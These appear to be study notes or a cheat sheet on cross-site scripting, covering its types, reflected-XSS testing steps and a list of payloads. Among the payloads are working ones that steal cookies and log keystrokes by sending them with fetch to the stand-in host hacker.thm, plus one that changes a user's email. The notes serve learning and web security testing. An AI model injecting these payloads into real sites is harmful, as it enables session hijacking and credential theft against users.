

What is cross-site scripting, XSS?
> Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application. 

XSS Proof Of Concept
- <script>alert(1);</script>
- "><img src=x onerror=alert(document.domain);>

What are the types of XSS attacks?
- Reflected XSS
- Stored XSS, AKA second-order or persistent XSS
- DOM-based XSS

Cross-site Scripting payload
- "onmouseover="alert(1)
- '-alert(1)-'
- Session Stealing <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
- Key Logger <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
- Business Logic <script>user.changeEmail('attacker@hacker.thm');</script>

# Reflected XSS
Reflected XSS arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. 
If something from URL reflected in document.
- Test every entry point.
- Submit random alphanumeric values.
- Determine the reflection context.
- Test a candidate payload.
- Test alternative payloads.
- Test the attack in a browser.

# Stored XSS
Stored XSS arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

# DOM-based XSS